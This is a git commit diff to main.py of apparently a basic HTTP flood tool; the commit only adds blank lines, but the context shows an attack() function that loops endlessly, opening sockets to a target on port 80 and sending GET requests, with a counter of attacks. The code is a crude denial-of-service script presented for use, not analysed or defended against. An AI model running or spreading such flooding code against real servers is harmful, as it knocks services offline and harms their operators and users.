b0b08cfc657ecf0e0141999ac60fc2452d995054
Yogauserganteng <108673500+Yogauserganteng@users.noreply.github.com>
2023-12-28 13:57:35 +0700

    Update main.py

--- main.py
+++ main.py
@@ -7,10 +7,12 @@ port = 80
 
 attack_num = 0
 
+
 def attack():
     while True:
         soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         soc.connect((target, port))
+
         soc.sendto(("GET /"+target+" HTTP/1.1\r\n").encode("ascii"), 
                    (target, port))
         
